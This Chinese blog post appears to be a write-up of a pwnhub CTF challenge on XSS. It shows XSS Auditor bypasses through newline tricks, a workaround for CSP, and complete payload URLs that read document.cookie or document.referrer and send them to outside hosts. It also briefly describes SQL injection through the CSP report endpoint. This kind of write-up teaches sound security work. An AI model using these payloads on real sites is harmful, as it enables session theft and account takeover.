---
title: pwnhub 改行做前端
date: 2017-08-15 23:21:49
tags:
- pwnhub
- xss
- csp
categories:
- Blogs
---

题目说实话是完成了一半，后一半是无意中上车的，有一些迷...关于注入部分是后来才发现的。

这里先按照我的思路来吧

<!--more-->

# self-xss #

站内有提交bug的地方，地址必须是`http://54.222.168.105:8065/`开头，也就是说我们必须找到一个self-xss的地方。

无意间发现，如果提交错误，那么错误是通过302跳回`?error=xxx`来输出到页面内jquery中，然后通过jquery输出到页面的，输出内容大多都经过了转义。

![image.png-199.5kB][1]

也就是说我们没办法通过闭合语句来执行js。

这里有一个小trick，假设`<>`没有被过滤，那么可以直接插入一个`</script>`，那么script闭合标签的优先级大于引号包裹，就会直接闭合。

![image.png-1102.1kB][2]

这下我们通过前后闭合，就可以在页面内插入任意标签了。现在又有了新的问题，因为题目中要求必须是最新版chrome，所以如果我们想要构造xss请求，就会被xss auditor拦截。

这里就需要几个长短短刚刚公布的基于换行的xss auditor bypass
```
<scirpt>(br=1)*/%0dalert(1)</script>
```

```
<script>alert(1)%0d%0a-->%09</script>
```
还有一种不闭合`</script`的方式，但是我本地测试失败了，不清楚是什么回事。

当我们能够bypass xss auditor的时候，出现了新的问题，CSP

![image.png-31.5kB][3]

这里有个小细节就是最后的`report-uri /report`，可能是看CSP太多了，完全没注意到这部分，就看到`unsafe-inline`就知道要干嘛了...这部分一会儿再说

因为有CSP，所以我们需要bypass unsafe-inline才能把数据发送出来。

测试了半天，不知道为什么不能使用location.href，可能是换行导致的语义有问题，这里我换用了a的click跳转，来发送数据出来。

```
var a=document.createElement("a");
a.href='http://xss.com/?cookie='+escape(document.cookie);
a.click();
```

因为单双引号会被转义，所以这里使用String.fromCharCode来替代所有的字符串。

最终打后台的payload
```
http://54.222.168.105:8065/?error=132</script><script>1<(br=1)*/%0dalert(1);a=document.createElement(String.fromCharCode(97));a.href=String.fromCharCode(104,116,116,112,58,47,47,48,120,98,46,112,119,63)%2bdocument.cookie;a.click();alert(2);</script>
```

这里有个小问题是`<>`是被过滤了，这里给了新的提示
```
2017.08.12 15:56:54后台代码：<a href="<?=htmlspecialchars($url)?>" target="_blank"><?=htmlspecialchars($url)?></a>，管理员会点击并查看，但要考虑浏览器的过滤。
```

链接是写入a标签的，bot通过点击来判断，那么我们本质上可以通过url编码或者html编码来绕过这部分判断，然后点击之后依然会进入链接，这里因为有htmlspecialchars在，所以html编码中的`&`就会被二次编码，所以只能使用url编码了。

```
http://54.222.168.105:8065/?error=132%3C%2fscript%3E%3Cscript%3E1%3C%28br=1)*/%0dalert(1);a=document.createElement(String.fromCharCode(97));a.href=String.fromCharCode(104,116,116,112,58,47,47,48,120,98,46,112,119,63)%2bdocument.referrer;a.click();alert(2%29%3B%3C%2fscript%3E
```

这里打到后台地址和cookie，进入后台发现一无所获，到很晚之后才发现后台有login.

但是我们无法登陆。

# 注入 #

这里我们又回到前台来，刚才我们提到CSP中有一部分`report-uri /report`

这是一个CSP中的功能，当请求处罚了CSP时，就会向report-uri发送一些信息

![image.png-121.2kB][4]

这里多个参数都存在注入点，其中过一个账号可以被解开，使用这个账号登陆后台就可以获得flag了。



  [1]: http://static.zybuluo.com/LoRexxar/d8xt7lg79qpug1bg5h2iz12f/image.png
  [2]: http://static.zybuluo.com/LoRexxar/6r4v068dowoe21oko5dc3bbm/image.png
  [3]: http://static.zybuluo.com/LoRexxar/tncxdcdxhyndjiwzhd78bjlk/image.png
  [4]: http://static.zybuluo.com/LoRexxar/n422bqq6r3t2bbrlaab4kfc8/image.png